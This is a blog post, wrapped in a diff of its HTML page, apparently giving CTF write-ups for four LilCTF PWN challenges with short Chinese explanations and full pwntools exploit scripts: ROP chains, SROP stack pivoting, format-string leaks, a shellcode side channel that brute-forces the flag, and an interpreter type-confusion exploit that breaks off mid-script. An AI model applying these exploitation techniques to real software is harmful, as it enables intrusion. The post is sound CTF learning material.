@@ -1,0 +1,1168 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+<head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />            
+    <meta http-equiv="Cache-Control" content="no-transform" />
+    <meta http-equiv="Cache-Control" content="no-siteapp" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="referrer" content="origin-when-cross-origin" />
+    <title>Lilctf PWN方向全全全全题解！ - imiab - 博客园</title>
+    
+    <meta name="description" content="I like C&#x2B;&#x2B; 114514后门选项，里面会设置一个函数指针，其中偏移3的地方为后门函数 里面有一个scanf(&amp;quot;%s&amp;quot;)，裸的栈溢出，还有格式化字符串 条件是拿到堆地址，只要我们输入的地址和它的堆地址一样就能触发 exchange里有个浅拷贝，会free对象并导致leak" />    
+    <meta property="og:description" content="I like C&#x2B;&#x2B; 114514后门选项，里面会设置一个函数指针，其中偏移3的地方为后门函数 里面有一个scanf(&amp;quot;%s&amp;quot;)，裸的栈溢出，还有格式化字符串 条件是拿到堆地址，只要我们输入的地址和它的堆地址一样就能触发 exchange里有个浅拷贝，会free对象并导致leak" />
+    <meta property="og:image" content="https://img2024.cnblogs.com/blog/3562901/202508/3562901-20250818161231120-1649496617.png" />
+    <meta property="bytedance:published_time" content="2025-08-18T16:18:40+08:00" />
+    
+    <link rel="stylesheet" href="/css/blog-common.min.css?v=6O_Ku8w_jYd3yw2BX9ElmxGv25AYbAQ-F6ZeOeZfxYc" />
+    
+    <link id="highlighter-theme-cnblogs" type="text/css" rel="stylesheet" href="/css/hljs/cnblogs.css?v=5J1NDtbnnIr2Rc2SdhEMlMxD4l9Eydj88B31E7_NhS4" />
+    <link type="text/css" rel="stylesheet" href="https://www.cnblogs.com/undefined/custom.css?v=M8To7qEiClk5j8&#x2B;gr6sf&#x2B;xNi&#x2B;ok=" />
+    
+    <link id="mobile-style" media="only screen and (max-width: 767px)" type="text/css" rel="stylesheet" href="/css/mobile-common.min.css?v=a5tjm35tHR3Bq88JZf8V-jiXDhgs5wg823qWgRI6uRY" />
+    
+    <link id="favicon" rel="icon" type="image/x-icon" sizes="32x32" href="https://assets.cnblogs.com/favicon_v3_3.ico" />
+    <link id="favicon_svg" rel="icon" type="image/svg+xml" href="https://assets.cnblogs.com/favicon_v3_3.svg" />
+    <link rel="apple-touch-icon" href="https://assets.cnblogs.com/apple-touch-icon.png?v=2" />
+    <link rel="canonical" href="https://www.cnblogs.com/undefined/p/19044898" />
+    <link type="application/rss+xml" rel="alternate" href="https://www.cnblogs.com/undefined/rss" />
+    <link type="application/rsd+xml" rel="EditURI" href="https://www.cnblogs.com/undefined/rsd.xml" />
+    <link type="application/wlwmanifest+xml" rel="wlwmanifest" href="https://www.cnblogs.com/undefined/wlwmanifest.xml" />
+    
+    <script type="application/ld&#x2B;json">
+    {
+      "@context": "https://schema.org",
+      "@type": "BlogPosting",
+      "@id": "https://www.cnblogs.com/undefined/p/19044898",
+      "headline": "Lilctf PWN方向全全全全题解！",
+      "description": "I like C&#x2B;&#x2B; 114514后门选项，里面会设置一个函数指针，其中偏移3的地方为后门函数 里面有一个scanf(\u0026quot;%s\u0026quot;)，裸的栈溢出，还有格式化字符串 条件是拿到堆地址，只要我们输入的地址和它的堆地址一样就能触发 exchange里有个浅拷贝，会free对象并导致leak 最终exp fro",
+      "image": [
+        
+      ],
+      "author": {
+        "@type": "Person",
+        "@id": "https://www.cnblogs.com/undefined/",
+        "name": "imiab",
+        "url": "https://www.cnblogs.com/undefined/"
+      },
+      "publisher": {
+        "@type": "Organization",
+        "@id": "https://www.cnblogs.com/",
+        "name": "博客园",
+        "url": "https://www.cnblogs.com/"
+      },
+      "datePublished": "2025-08-18T16:19:00.0000000&#x2B;08:00",
+      "dateModified": "2025-08-18T16:19:00.0000000&#x2B;08:00",
+      "wordCount": "20732",
+      "isPartOf": {
+        "@type": "Blog",
+        "@id": "https://www.cnblogs.com/undefined/",
+        "name": "undefined",
+        "publisher": {
+          "@type": "Organization",
+          "@id": "https://www.cnblogs.com/",
+          "name": "博客园"
+        }
+      }
+    }
+    </script>
+
+    <script>
+        var currentBlogId = 841504;
+        var currentBlogApp = 'undefined';
+        var isLogined = false;
+        var isBlogOwner = false;
+        window.isCorp = false;
+        window.skinName = 'Custom';
+        var visitorUserId = '';
+        window.hasCustomScript = true;
+        window.cb_enable_mathjax = false;
+        window.mathEngine = 1;
+        window.codeHighlightEngine = 1;
+        window.enableCodeLineNumber = false;
+        window.codeHighlightTheme = 'cnblogs';
+        window.darkModeCodeHighlightTheme = 'vs2015';
+        window.isDarkCodeHighlightTheme = false;
+        window.isDarkModeCodeHighlightThemeDark = true;
+        window.isDisableCodeHighlighter = false;
+        window.enableCodeThemeTypeFollowSystem = false;
+        window.enableMacStyleCodeBlock = false;        
+    </script>
+        <script>
+            window.currentPostId = 19044898;
+            window.currentPostDateAdded = '2025-08-18 16:19';
+        </script>
+    <script src="https://assets.cnblogs.com/scripts/jquery-3.3.1.min.js"></script>
+    <script src="https://cdn-www.cnblogs.com/js/blog-common.min.js?v=q6A5rdB3tiIeY5Vi562gBAr3OVg5t0HcQVXePY_F0qU"></script>
+        <script>updateCustomBlogReferrer();</script>
+    
+</head>
+<body class="skin-custom has-navbar">
+    <a name="top"></a>
+    <div id="top_nav" class="navbar forpc">
+        <nav id="nav_main" class="navbar-main">
+            <ul id="nav_left" class="navbar-list navbar-left">
+                <li class="navbar-branding">
+                    <a href="https://www.cnblogs.com/" title="开发者的网上家园" role="banner">
+                        <img src="//assets.cnblogs.com/logo.svg" alt="博客园logo" />
+                    </a>
+                </li>
+                <li><a href="https://cnblogs.vip/">会员</a></li>
+                <li><a href="https://cnblogs.vip/store">周边</a></li>
+                <li><a href="https://news.cnblogs.com/" onclick="countClicks('nav', 'skin-navbar-news')">新闻</a></li>
+                <li><a href="https://q.cnblogs.com/" onclick="countClicks('nav', 'skin-navbar-q')">博问</a></li>
+                <li><a href="https://ing.cnblogs.com/" onclick="countClicks('nav', 'skin-navbar-ing')">闪存</a></li>                
+                <li><a href="https://www.cnblogs.com/cmt/p/19316348">赞助商</a></li>
+                <li><a href="https://chat2db-ai.com/" target="_blank">Chat2DB</a></li>
+            </ul>
+            <ul id="nav_right" class="navbar-list navbar-right">
+                <li>
+                    <form id="zzk_search" class="navbar-search dropdown" action="https://zzk.cnblogs.com/s" method="get" role="search">
+                        <input name="w" id="zzk_search_input" placeholder="代码改变世界" type="search" tabindex="3" autocomplete="off" />
+                        <button id="zzk_search_button" onclick="window.navbarSearchManager.triggerActiveOption()">
+                            <img id="search_icon" class="focus-hidden" src="//assets.cnblogs.com/icons/search.svg" alt="搜索" />
+                            <img class="hidden focus-visible" src="//assets.cnblogs.com/icons/enter.svg" alt="搜索" />
+                        </button>
+                        <ul id="navbar_search_options" class="dropdown-menu quick-search-menu">
+                            <li tabindex="0" class="active" onclick="zzkSearch(event, document.getElementById('zzk_search_input').value)">
+                                <div class="keyword-wrapper">
+                                    <img src="//assets.cnblogs.com/icons/search.svg" alt="搜索" />
+                                    <div class="keyword"></div>
+                                </div>
+                                <span class="search-area">所有博客</span>
+                            </li>
+                                    <li tabindex="1" onclick="zzkBlogSearch(event, 'undefined', document.getElementById('zzk_search_input').value)">
+                                        <div class="keyword-wrapper">
+                                            <img src="//assets.cnblogs.com/icons/search.svg" alt="搜索" />
+                                            <div class="keyword"></div>
+                                        </div>
+                                        <span class="search-area">当前博客</span>
+                                    </li>
+                        </ul>
+                    </form>
+                </li>
+                <li id="navbar_login_status" class="navbar-list">
+                    <a class="navbar-user-info navbar-blog" href="https://i.cnblogs.com/EditPosts.aspx?opt=1" alt="写随笔" title="写随笔">
+                        <img id="new_post_icon" class="navbar-icon" src="//assets.cnblogs.com/icons/newpost.svg" alt="写随笔" />
+                    </a>
+                    <a id="navblog-myblog-icon" class="navbar-user-info navbar-blog" href="https://www.cnblogs.com/my" alt="我的博客" title="我的博客">
+                        <img id="myblog_icon" class="navbar-icon" src="//assets.cnblogs.com/icons/myblog.svg" alt="我的博客" />
+                    </a>
+                    <a class="navbar-user-info navbar-message navbar-icon-wrapper" href="https://msg.cnblogs.com/" alt="短消息" title="短消息">
+                        <img id="msg_icon" class="navbar-icon" src="//assets.cnblogs.com/icons/message.svg" alt="短消息" />
+                        <span id="msg_count" style="display: none"></span>
+                    </a>
+                    <a id="navbar_lite_mode_indicator" data-current-page="blog" style="display: none" href="javascript:void(0)" alt="简洁模式" title="简洁模式启用，您在访问他人博客时会使用简洁款皮肤展示">
+                        <img class="navbar-icon" src="//assets.cnblogs.com/icons/lite-mode-on.svg" alt="简洁模式" />
+                    </a>
+                    <div id="user_info" class="navbar-user-info dropdown">
+                        <a class="dropdown-button" href="https://home.cnblogs.com/">
+                            <img id="user_icon" class="navbar-avatar" src="//assets.cnblogs.com/icons/avatar-default.svg" alt="用户头像" />
+                        </a>
+                        <div class="dropdown-menu">
+                            <a id="navblog-myblog-text" href="https://www.cnblogs.com/my">我的博客</a>
+                            <a href="https://home.cnblogs.com/">我的园子</a>
+                            <a href="https://account.cnblogs.com/settings/account">账号设置</a>
+                            <a href="https://vip.cnblogs.com/my">会员中心</a>
+                            <a href="javascript:void(0)" id="navbar_lite_mode_toggle" title="简洁模式会使用简洁款皮肤显示所有博客">
+    简洁模式 <span id="navbar_lite_mode_spinner" class="hide">...</span>
+</a>
+
+                            <a href="javascript:void(0)" onclick="account.logout();">退出登录</a>
+                        </div>
+                    </div>
+                    <a class="navbar-anonymous" href="https://account.cnblogs.com/signup">注册</a>
+                    <a class="navbar-anonymous" href="javascript:void(0);" onclick="account.login()">登录</a>
+                </li>
+            </ul>
+        </nav>
+    </div>
+
+    <div id="page_begin_html">
+        <div id="loading"><div class="loader-inner"></div></div>
+    </div>
+
+    <div id="home">
+<div id="header">
+	<div id="blogTitle">
+        <a id="lnkBlogLogo" href="https://www.cnblogs.com/undefined/"><img id="blogLogo" src="/skins/custom/images/logo.gif" alt="返回主页" /></a>		
+		
+
+<h1><a id="Header1_HeaderTitle" class="headermaintitle HeaderMainTitle" href="https://www.cnblogs.com/undefined">undefined</a>
+</h1>
+<h2></h2>
+
+
+
+
+		
+	</div>
+	<div id="navigator">
+		
+<ul id="navList">
+<li><a id="blog_nav_sitehome" class="menu" href="https://www.cnblogs.com/">
+博客园</a>
+</li>
+<li>
+<a id="blog_nav_myhome" class="menu" href="https://www.cnblogs.com/undefined/">
+首页</a>
+</li>
+<li>
+
+<a id="blog_nav_newpost" class="menu" href="https://i.cnblogs.com/EditPosts.aspx?opt=1">
+新随笔</a>
+</li>
+<li>
+<a id="blog_nav_contact" class="menu" href="https://msg.cnblogs.com/send/imiab">
+联系</a></li>
+<li>
+<a id="blog_nav_rss" class="menu" href="javascript:void(0)" data-rss="https://www.cnblogs.com/undefined/rss/">
+订阅</a>
+<!--<partial name="./Shared/_XmlLink.cshtml" model="Model" /></li>--></li>
+<li>
+<a id="blog_nav_admin" class="menu" href="https://i.cnblogs.com/">
+管理</a>
+</li>
+</ul>
+
+
+		<div class="blogStats">
+			<div id="blog_stats_place_holder"><script>loadBlogStats();</script></div>
+		</div>
+	</div>
+</div>
+<div id="main">
+	<div id="mainContent">
+	<div class="forFlow">
+		<div id="post_detail">
+    
+    <div id="topics">
+        <div class="post">
+            <h1 class = "postTitle">
+                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/undefined/p/19044898" title="发布于 2025-08-18 16:18">
+    
+
+    <span role="heading" aria-level="2">Lilctf PWN方向全全全全题解！</span>
+    
+
+</a>
+
+            </h1>
+            <div class="clear"></div>
+            <div class="postBody">
+                <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
+<h1 id="i-like-c">I like C++</h1>
+<p><img src="https://img2024.cnblogs.com/blog/3562901/202508/3562901-20250818161231120-1649496617.png" alt="PixPin_2025-08-18_08-54-06" loading="lazy"></p>
+<p><img src="https://img2024.cnblogs.com/blog/3562901/202508/3562901-20250818161248629-176344069.png" alt="PixPin_2025-08-18_08-54-35" loading="lazy"></p>
+<p>114514后门选项，里面会设置一个函数指针，其中偏移3的地方为后门函数</p>
+<p>里面有一个scanf("%s")，裸的栈溢出，还有格式化字符串</p>
+<p><img src="https://img2024.cnblogs.com/blog/3562901/202508/3562901-20250818161255192-968306285.png" alt="PixPin_2025-08-18_08-55-21" loading="lazy"></p>
+<p>条件是拿到堆地址，只要我们输入的地址和它的堆地址一样就能触发</p>
+<p>exchange里有个浅拷贝，会free对象并导致leak</p>
+<p>最终exp</p>
+<pre><code class="language-python">from pwn import *
+filename = './pwn'
+libc = ELF("./libc.so.6")
+host= 'challenge.xinshi.fun'
+port= 42509
+
+sla = lambda x,s : p.sendlineafter(x,s)
+sl = lambda s : p.sendline(s)
+sa = lambda x,s : p.sendafter(x,s)
+s = lambda s : p.send(s)
+
+e = ELF(filename)
+context.log_level='debug'
+context(arch=e.arch, bits=e.bits, endian=e.endian, os=e.os)
+
+def addtype(tp):
+    sla("Enter your choice:","1")
+    sla("Enter item type:",tp)
+
+def additem(tp,name,desc):
+    sla("Enter your choice:","2")
+    sla("Enter item type:",tp)
+    sla("Enter item name: ",name)
+    sla("Enter item description",desc)
+
+def edit(tp,idx,name,desc):
+    sla("Enter your choice:","3")
+    sla("Enter item type:",tp)
+    sla("Enter item index: ",str(idx))
+    sla("Enter item name: ",name)
+    sla("Enter item description",desc)
+
+def show(tp,idx):
+    sla("Enter your choice:","4")
+    sla("Enter item type:",tp)
+    sla("Enter item index: ",str(idx))
+
+def dele(tp,idx):
+    sla("Enter your choice:","5")
+    sla("Enter item type:",tp)
+    sla("Enter item index: ",str(idx))
+
+def exchange(tp1,idx,tp2):
+    sla("Enter your choice:","6")
+    sla("Enter item name: ","testname")
+    sla("Enter item description","testdesc")
+    
+    sla("Enter item type:",tp1)
+    sla("Enter item index: ",str(idx))
+    sla("Enter item type:",tp2)
+
+def exchange1(tp1,idx,tp2):
+    sla("Enter your choice:","6")
+    sla("Enter item name: ","testname")
+    sla("Enter item description","testdesc")
+    
+    sla("Enter item type:",tp1)
+    sla("Enter item type:",tp2)
+
+def hack():
+    sla("Enter your choice:","0")
+
+def hack1():
+    sla("Enter your choice:","114514")
+
+def run(mode, script = ""):
+    if "d" in mode:
+        p = gdb.debug(filename, script)
+    elif "l" in mode:
+        p = process(filename)
+    elif "r" in mode:
+        p = remote(host, port)
+    elif "a" in mode:
+        p = process(filename)
+        gdb.attach(p, script)
+    return p
+
+def getp():
+    global script
+    if len(sys.argv) == 2:
+        p = run(sys.argv[1], script)
+    else:
+        p = run("l", script)
+    return p
+
+script = '''
+go
+'''
+
+def pwn():
+    global p
+    p = getp()
+    addtype("type1")
+    additem("type1","b"*0x100,b"a"*0x30)
+    addtype("type2")
+    addtype("type3")
+    exchange("type1",0,"type2")
+
+    show("type1",0)
+    p.recvuntil("Item name: ")
+    heap_addr=u64(p.recv(8))*0x1000+0x400
+    hack1()
+    p.sendlineafter("いいよ、こ",str(heap_addr))
+    hack()
+    p.sendlineafter("Invalid choice. Please try again",f"%6$p%{6+9}$p%{6+0xd}$p%{6+0x6d}$p")
+    
+    p.recvuntil("0x")
+    stkaddr=int(p.recv(12),16)
+    p.recvuntil("0x")
+    canary=int(p.recv(16),16)
+    p.recvuntil("0x")
+    elfaddr=int(p.recv(12),16)- 0xEC7E
+    p.recvuntil("0x")
+    libcbase=int(p.recv(12),16)-0x2a28b
+    
+    rdi=libcbase+0x000000000010f75b
+    rsi=libcbase+0x0000000000110a4d
+    rdx_pop4 = libcbase+0x00000000000b503c
+    rcx = 0x00000000000a877e+libcbase
+    rsp = 0x000000000003c068 +libcbase
+    rax=libcbase+0x000dd237
+    sys_ret = libcbase + 0x98FD5
+    ret=rdi+1
+
+    execve=libcbase+libc.sym["execveat"]
+    saddr = libcbase + libc.sym["system"]
+    waddr = libcbase +libc.sym["write"]
+    sh=libcbase+0x01cb42f
+
+    sleep(0.2)
+    payload = p64(canary)*7
+    payload += flat(rdi, 0, rsi, libcbase+libc.bss(0x400), rdx_pop4, 0x300, 0, 0, 0, 0, rax, 0x0, sys_ret, rsp, libcbase+libc.bss(0x420))
+    # payload += p64(rdi)+64(heap_addr&amp;0xfffffffff000)+p64(rsi)+p64(0x1000)+p64(rdx_pop4)+p64(7)*5+p64(rax)+p64(10)+p64(sys_ret)
+    # payload += p64(rdi)+p64(0)+p64(rsi)+p64(heap_addr)+p64(rdx_pop4)+p64(0x100)*5+p64(rax)+p64(0)+p64(sys_ret)+p64(heap_addr)
+    # +p64(rdx_pop4)+p64(0x00)*5+p64(rdi)+p64(0xfffffff9c)+p64(0)+p64(rsi)+p64(sh)*2+p64(execve)
+    # pause()
+    sl(payload)
+    sleep(0.2)
+    # payload = p64(rdi+1)+p64(rdi+1)+p64(rdi)+p64(sh+5)+p64(rsi)+p64(0)+p64(rdx_pop4)+p64(00)+p64(0)*4+p64(rax)+p64(2)+p64(saddr)
+    # payload = p64(rdi) + p64(2) + p64(rax) + p64(3) + p64(sys_ret)
+    payload = b"/flag".ljust(0x20, b'\x00')
+    # payload = flat(rdi, 0, rsi, 2, rax, 0x21, sys_ret)
+    # payload += flat(rdi, 0, rax, 3, sys_ret)
+    # payload += flat(rdi, libc_addr+libc.bss(0x400), rsi, 0, rdx_pop4, 0, 0, 0, 0, 0, rax, 0x3b, sys_ret)
+    payload += flat(rdi, libcbase+libc.bss(0x400), rsi, 0, rdx_pop4, 0, 0, 0, 0, 0, rax, 2, sys_ret)
+    payload += flat(rdi, 3, rsi, libc.bss(0x400)+libcbase, rdx_pop4, 0x100, 0, 0, 0, 0, rax, 0, sys_ret)
+    payload += flat(rdi, 1, rsi, libc.bss(0x400)+libcbase, rdx_pop4, 0x100, 0, 0, 0, 0, rax, 1, sys_ret)
+    s(payload)
+
+pwn()
+p.interactive()
+</code></pre>
+<h1 id="ret2all">ret2all</h1>
+<p>栈溢出，但是要求前0x60个字符是i love you，且当前函数的rbp的返回地址不能更改</p>
+<p>虽然不能更改当前函数的，但是能改下一个函数的</p>
+<p>但是只能改到rbp</p>
+<p>中间有0x10的字节</p>
+<p>做栈溢出，缩短栈帧，确保 rbp - 0x60 &gt; rsp</p>
+<p>这样读入的时候就会直接修改read的返回地址，从而扩大溢出范围到0x88</p>
+<p>在后来的栈迁移中我们必须始终保持这个条件成立</p>
+<p>用sub rsp 0x60 ... 和pop rbp; ret;来控制栈，在高地址我们会找到一个残留的free</p>
+<p>这个高地址free附近有一个pop rbx，设置rbx以后用magic gadget把这个地址修改为syscall; ret;</p>
+<p>然后构造两次SROP，分别打出 dup 1 和 write 2 泄露 libc 地址</p>
+<p>之后简单的ROP即可</p>
+<pre><code class="language-python">from pwn import *
+filename = './pwn'
+# libc = ELF("./libc.so.6")
+host= 'challenge.xinshi.fun'
+port= 31266
+
+sla = lambda x,s : p.sendlineafter(x,s)
+sl = lambda s : p.sendline(s)
+sa = lambda x,s : p.sendafter(x,s)
+s = lambda s : p.send(s)
+
+e = ELF(filename)
+context.log_level='debug'
+context(arch=e.arch, bits=e.bits, endian=e.endian, os=e.os)
+
+def run(mode, script = ""):
+    if "d" in mode:
+        p = gdb.debug(filename, script)
+    elif "l" in mode:
+        p = process(filename)
+    elif "r" in mode:
+        p = remote(host, port)
+    elif "a" in mode:
+        p = process(filename)
+        gdb.attach(p, script)
+    return p
+
+def getp():
+    global script
+    if len(sys.argv) == 2:
+        p = run(sys.argv[1], script)
+    else:
+        p = run("l", script)
+    return p
+
+script = '''
+go
+'''
+
+def pwn():
+    global p
+    p = getp()
+    p.recvuntil("RBP:")
+    rbp_key = int(p.recvline(keepends=False), 16)
+    p.recvuntil("RET:")
+    pie = int(p.recvline(keepends=False), 16) - 0x1871
+    e.address = pie
+    ret_key = pie+0x1871
+    rbp = 0x1253 + pie
+    ret = rbp+1
+    lr = pie + 0x164e
+    magic = pie + 0x1252
+
+    love = b"I love you I feel lonely"
+    pay1 = love*4 + flat(rbp_key, ret_key, rbp_key-0x10, pie+0x182b, rbp_key -0x10)
+    s(pay1)
+    payload = SigreturnFrame()
+    payload.rdi=1
+    payload.rsi=0
+    payload.rdx=0
+    payload.rax=0x20
+    payload.rsp=rbp_key-0xf8
+    payload.rbp=rbp_key-0xf8
+    payload.rip=ret
+    sleep(0.1)
+    pay2 = flat(0,ret,ret,ret,ret,ret,ret,rbp, rbp_key-0x40, pie+0x182b,0,0,0,0,0,0,0)
+    s(pay2)
+
+    sleep(0.1)
+    pay3 = flat(0x11,0x22,0x33,rbp,rbp_key-0x90,pie+0x182b,0x77,0x108, 0 ,0xaa,rbp_key-0x100,ret,0xdd,0x33, 0, 0)
+    s(pay3)
+
+    sleep(0.1)
+    pay4 = flat(0x31823, ret, ret, ret, rbp, rbp_key-0x100, pie+0x182b, 0x7 ,0x8 , 0x9, 0xa, 0xb, 0xc, 0 , rbp_key-0xf0, rbp_key-0x100)
+    s(pay4)
+
+    sleep(0.1)
+    pay5 = flat(1, 2, 3, 4, 5, 6, 7, 8, ret, ret, ret, ret, ret) +b'\xb6'
+    s(pay5)
+
+    sleep(0.1)
+    pay6 = flat(1, 2, 3, 4, 5, 6, 7, 8, rbp, rbp_key-0x130, pie+0x182b, ret, ret)
+    s(pay6)
+    
+    sleep(0.1)
+    pay7 = flat(1, 2, 3, 4, rbp, rbp_key-0xf8+0x3d, magic, rbp, rbp_key-0xe8, pie+0x182f, ret, ret, ret, ret, ret, ret, ret)
+    s(pay7)
+
+    sleep(0.1)
+    s(p64(ret)+p64(ret)[0:7])
+
+    sleep(0.1)
+    s(p64(rbp)+p64(rbp_key-0xe0)+p64(pie+0x182b)+p64(ret)+p64(ret)+p64(rbp)+p64(rbp_key-0xd0+0x78)+p64(pie+0x182f)+bytes(payload)[0x40::])
+
+    sleep(0.1)
+    s(p64(ret)+p64(ret)[0:7])
+
+    sleep(0.1)
+    s(flat(rbp, rbp_key-0xe0, lr, ret))
+    # pay11 = flat(rbp, rbp_key-0xf8+0x90, pie+0x182f,)
+
+    sleep(0.1)
+    s(flat(rbp, rbp_key-0xe0+0x38, pie+0x182b, 0xaaaaaaaa, 0xbb, 0xcc, 2, rbp_key-0x120, rbp_key-0x100, 0xee, 0x100, 1, 0x1234))
+    
+    sleep(0.1)
+    s(p64(ret)+p64(ret)[0:7])
+
+    p.recvuntil("Keep it and...I love you\n")
+    p.recv(0x28)
+    libcbase = u64(p.recv(8))-0xdf5d9
+    print(hex(libcbase))
+
+    sys_ret = libcbase + 0xDF5D9
+    rdi = libcbase + 0x000000000010f75b
+    rsi = libcbase + 0x0000000000110a4d
+    rax = libcbase + 0x00000000000dd237
+    rdx_pop4 = libcbase + 0x00000000000b503c
+
+    sleep(0.1)
+    pay = p64(rdx_pop4)+p64(0x1000)+p64(0)*4+p64(rdi)+p64(0)+p64(rsi)+p64(rbp_key-0xf0)+p64(sys_ret) 
+    s(pay)  
+
+    sleep(0.1)
+    final = b"/flag\x00\x00\x00" + flat(rdi, rbp_key-0xf0, rsi, 0, rdx_pop4, 0, 0, 0, 0, 0, rax, 2, sys_ret)
+    final += flat(rax, 0x20, rdi, 0, sys_ret)
+    final += flat(rax, 0x21, rdi, 3, rsi, 0, sys_ret)
+    final += flat(rdx_pop4, 0x100, 0, 0, 0, 0, rsi, rbp_key-0x20, rdi, 0, sys_ret)
+    final += flat(rax, 1, rdi, 2, sys_ret)
+    pause()
+    s(final)
+    # print(hex(pie))
+    # print(hex(rbp_key))
+
+    # for i in range(0, len(bytes(payload)), 8):
+        # print(i/8, hex(u64(bytes(payload)[i:i+8])))
+
+pwn()
+p.interactive()
+</code></pre>
+<h1 id="trumanshow">trumanshow</h1>
+<p>这道题是侧信道，通过控制程序错误码来爆破flag</p>
+<p>给的shellcode太短，把要设置的字符串flag和其它值read到栈上然后pop可以减少长度</p>
+<p>虽然chroot了根目录，但是openat没有禁用，可以用openat的相对目录功能来打开flag</p>
+<p>(fd = 2 -&gt; "/"，然后rdi = 2, rsi = flag, rdx = 0, r10 = 0 即可)</p>
+<p>最后就是爆破，因为过滤了那几个字符，我们不能用add和cmp</p>
+<p>但是我们可以用sub和jb、ja、je来做同样的事情</p>
+<p>注意flag字符包括过滤的那几个字符，所以可能要多次修改shellcode确保最终flag正确。</p>
+<pre><code class="language-python">#!/bin/python3
+from pwn import *
+filename = './chtest'
+# libc = ELF("./libc.so.6")
+host= 'challenge.xinshi.fun'
+port= 45912
+
+sla = lambda x,s : p.sendlineafter(x,s)
+sl = lambda s : p.sendline(s)
+sa = lambda x,s : p.sendafter(x,s)
+s = lambda s : p.send(s)
+
+e = ELF(filename)
+context.log_level='debug'
+# context.gdbpath = '/usr/bin/gdb'
+context(arch=e.arch, bits=e.bits, endian=e.endian, os=e.os)
+context.terminal = ['tmux', 'splitw', '-h']
+
+def run(mode, script = ""):
+    if "d" in mode:
+        p = gdb.debug(filename, script)
+    elif "l" in mode:
+        p = process(filename)
+    elif "r" in mode:
+        p = remote(host, port)
+    elif "a" in mode:
+        p = process(filename)
+        gdb.attach(p, script)
+    return p
+
+def getp():
+    global script
+    if len(sys.argv) == 2:
+        p = run(sys.argv[1], script)
+    else:
+        p = run("l", script)
+    return p
+
+script = '''
+go
+'''
+
+def pwn(offset, value):
+    global p
+    p = getp()
+    shellcode = f"""
+push rsp
+pop rsi
+push 0x7f
+pop rdx
+xor eax, eax
+syscall
+
+pop rax
+pop rax
+pop rax
+pop rdi
+pop rdx
+pop r10
+syscall
+
+push rax
+pop rdi
+pop rax
+pop rdx
+syscall
+
+mov al, byte ptr[rsi+{offset}]
+sub al, {value*2}
+sub al, {-value}
+
+je loc1
+ud2
+loc1:
+"""
+    # print(asm(shellcode))
+    
+    p.recvuntil("Now it's your show time")
+    s(asm(shellcode))
+    # s(len(asm(shellcode)))
+    sleep(0.1)
+    s(b'flag\x00\x00\x00\x00'+p64(0)+p64(0x101)+p64(2)+p64(0)+p64(0)+p64(0)+p64(0x7f))
+    content = p.recvall(timeout=0.5)
+    print(content)
+    if b'132' in content:
+        return 1
+    else:
+        return 0
+
+def bom():
+    # pwn(0, 0x80)
+    flag = 'LILCTF{64d0f0d6-ee5f-4373-8772-2e423bd887d1}'
+           #LILCTF{64d0f0d6-ee5f-4373-?772-2e423bd??7d1}
+    flag2 = ''
+    for i in range(0, len(flag)):
+        ans = u8(flag[i].encode())
+        j = 0
+        if pwn(i, ans) == 0:
+            flag2 += chr(ans)
+            print(flag2)
+            sleep(0.5)
+            continue
+        times = 0
+        while True:
+            times += 1
+            if times &gt; 5:
+                flag2 += '?'
+                break
+            j += 1
+            ans += j
+            if pwn(i, ans) == 0:
+                flag2 += chr(ans)
+                break
+            j += 1
+            ans -= j
+            if pwn(i, ans) == 0:
+                flag2 += chr(ans)
+                break
+
+        # flag += chr(ans + 1)
+        print(flag2)
+        sleep(0.5)
+bom()
+p.interactive()
+
+# 这里只有最终版本的shellcode，也就是验证用的shellcode
+# 正常情况下你无法通过这一段shellcode较快地获得 flag
+# 是先写二分拿到大概的flag， 然后再用这个shellcode校正错误的部分
+</code></pre>
+<h1 id="kuroko">kuroko</h1>
+<p>不说了先上exp！</p>
+<pre><code class="language-python">import kuroko
+let MIN_NORMAL_FLOAT = 2.2250738585072014e-308
+
+def parse_float(val):
+    let n = 0
+    for x in list(kuroko.inspect_value(val))[::-1]:
+        n = (n &lt;&lt; 8) | x
+    return n
+
+def create_float(val):
+    let krkvalue_holder = val.to_bytes(8, 'little')
+    let it = tupleiterator(id(krkvalue_holder) - 8)
+    return it()
+
+def pow(base, exp):
+    # Case 1: Exponent is zero
+    if exp == 0:
+        return 1.0
+
+    # Case 2: Handle negative exponents
+    let is_negative = exp &lt; 0
+    if is_negative:
+        exp = -exp
+
+    let result = 1.0
+    let b = float(base)
+    let e = exp
+
+    # Efficiently calculate power for the positive exponent
+    while e &gt; 0:
+        if (e &amp; 1) == 1: # If exponent is odd, multiply base into result
+            result *= b
+        b *= b
+        e = e &gt;&gt; 1 
+        if is_negative:
+        return 1.0 / result
+    else:
+        return result
+
+
+def float_to_int64(f):
+    if f == 0.0:
+        return 0
+
+    let sign_bit = 0
+    if f &lt; 0:
+        sign_bit = 1 &lt;&lt; 63
+    
+    let val = abs(f)
+    
+    let exponent_biased = 0
+    let mantissa = 0
+
+    if val &gt;= MIN_NORMAL_FLOAT:
+        let exponent = 0
+        let mantissa_val = val
+        if mantissa_val &gt;= 1.0:
+            while mantissa_val &gt;= 2.0:
+                mantissa_val = mantissa_val / 2.0
+                exponent += 1
+        else:
+            while mantissa_val &lt; 1.0:
+                mantissa_val = mantissa_val * 2.0
+                exponent -= 1
+        
+        exponent_biased = exponent + 1023
+        mantissa = int((mantissa_val - 1.0) * 4503599627370496)
+    else:
+        exponent_biased = 0
+        let mantissa_fraction = val / MIN_NORMAL_FLOAT
+        mantissa = int(mantissa_fraction * 4503599627370496)
+
+    return sign_bit | (exponent_biased &lt;&lt; 52) | mantissa
+
+def pwn():
+    
+
+    let fake_array = bytearray(0x1000)
+    let fake_array_addr = id(fake_array)
+    let list_class = id([].__class__)
+    let fake_tuple_str = 8.to_bytes(8, 'little')
+    fake_tuple_str += 0.to_bytes(8, 'little')
+    fake_tuple_str += b'\x00\x00\x01\x00\x00\x00\x00\x00'
+    fake_tuple_str += b'\x00\x00\x01\x00\x00\x00\x00\x00'
+    let fake_tuple_str_addr =id(fake_tuple_str)
+    fake_tuple_str += (fake_array_addr+0x3f).to_bytes(8, 'little')
+    fake_tuple_str += (fake_array_addr+0x48).to_bytes(8, 'little')
+
+    let fake_tuple_str_addr2 = id(fake_tuple_str)
+    let fake_iter = tupleiterator(id(fake_tuple_str)+0x30) 
+
